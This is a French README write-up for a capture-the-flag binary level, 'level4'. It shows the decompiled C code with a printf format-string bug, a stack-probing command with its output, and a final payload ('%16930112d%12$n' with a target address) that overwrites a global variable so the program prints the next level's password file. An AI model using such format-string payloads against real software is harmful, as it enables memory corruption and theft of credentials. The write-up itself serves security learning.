### README - Exploitation du programme `level4`

## Introduction

Nous avons un exécutable `level4` avec les options suivantes :

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

### Code source décompilé

Voici le code source décompilé du programme `level4` :

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n(void) {
  char local_20c[520];
  
  fgets(local_20c, 0x200, stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void) {
  n();
  return;
}
```

### Analyse de la vulnérabilité

La fonction `p` utilise `printf` avec un argument utilisateur sans spécificateur de format, ce qui est vulnérable à une attaque par chaîne de format. La condition pour exécuter la commande `system` est que la variable `m` soit égale à `0x1025544`.

## Voici une explication simplifiée de ce que cela pourrait représenter :

%16930112d : Cela pourrait être une spécification de format utilisée pour formater un entier (d pour "decimal") avec une largeur spécifique de 16930112 caractères. Dans un contexte de formatage de chaîne en C, cela pourrait potentiellement causer des comportements inattendus, comme des dépassements de tampon.

%12$n : Cela indique que le 12e argument passé à la fonction de formatage (comme printf) devrait être interprété comme une adresse où écrire un nombre. C'est une technique couramment utilisée dans les attaques de type format string, où un attaquant essaie de manipuler directement la mémoire du programme.

= 0x1025544 : Cela pourrait représenter l'adresse en mémoire ou une valeur hexadécimale attendue ou générée par cette chaîne de formatage.



### Identification de la position de l'argument

Pour exploiter la vulnérabilité, nous devons trouver la position de notre chaîne injectée dans les arguments de `printf`.

1. **Utilisation d'une chaîne de format exploratoire pour afficher les valeurs sur la pile** :

   ```bash
   python -c 'print "AAAA" + " %x" * 20' | ./level4
   ```

2. **Analyse de la sortie** :

   ```
   AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
   ```

   Nous voyons `0x41414141` (qui représente "AAAA" en ASCII) à la 12ème position dans la sortie. Cela signifie que notre chaîne injectée est le 12ème argument de `printf`.



#### a. Exploitation par constructions du payload

```bash
(python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")'; cat -) | ./level4
```

### Conclusion

En utilisant cette approche, nous avons exploité la vulnérabilité de chaîne de format pour modifier la variable `m` et déclencher la condition qui exécute la commande système pour afficher le contenu de `/home/user/level5/.pass`.

### Code source décompilé pour explication

Voici à nouveau le code source décompilé pour une explication plus claire :

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n(void) {
  char local_20c[520];
  
  fgets(local_20c, 0x200, stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void) {
  n();
  return;
}
```

### Explication

- **`fgets`** : Lit l'entrée utilisateur dans un buffer.
- **`printf`** : Affiche le buffer sans spécificateur de format, rendant le programme vulnérable aux attaques de chaîne de format.
- **Condition sur `m`** : Si `m` vaut `0x1025544`, le programme exécute `system("/bin/cat /home/user/level5/.pass")`.

En utilisant la vulnérabilité de chaîne de format, nous avons écrit `0x1025544` à l'adresse de `m` pour satisfaire cette condition et obtenir le mot de passe pour le niveau suivant.
